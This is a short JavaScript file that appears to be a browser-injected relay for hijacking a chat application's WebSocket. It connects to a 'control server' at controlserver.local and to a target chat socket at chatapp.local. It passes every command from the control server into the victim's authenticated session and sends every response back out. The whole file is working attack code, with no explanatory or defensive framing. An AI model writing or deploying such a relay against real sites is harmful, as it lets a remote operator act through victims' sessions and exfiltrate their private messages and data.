console.log("[RELAY] Script loaded");

const controlSocket = new WebSocket("ws://controlserver.local:9000/");
const targetSocket = new WebSocket("wss://chatapp.local:3000/ws");

controlSocket.onmessage = (event) =>
{
    const command = event.data;
    console.log("[RELAY] Command received:",command);

    if ( targetSocket.readyState === WebSocket.OPEN) 
    {
        console.log("[RELAY] Forwarding command to target");
        targetSocket.send(command);

    } 
    else 
    {
        console.log("[RELAY] Target WebSocket not ready");
    }
};

targetSocket.onmessage = (event) =>
{
    const response = event.data;
    console.log("[RELAY] Target response:",response);

    if (controlSocket.readyState === WebSocket.OPEN)
    {
        console.log("[RELAY] Forwarding response to control server");
        controlSocket.send(response);
    }
};

// ------------------------------------------------
// CONNECTION EVENTS
// ------------------------------------------------

controlSocket.onopen = () => 
{
    console.log("[RELAY] Connected to control server");
};

targetSocket.onopen = () => 
{
    console.log("[RELAY] Connected to target WebSocket");
};

controlSocket.onerror = () => 
{
    console.log("[RELAY] Control connection error");
};

targetSocket.onerror = () => 
{
    console.log("[RELAY] Target connection error");
};
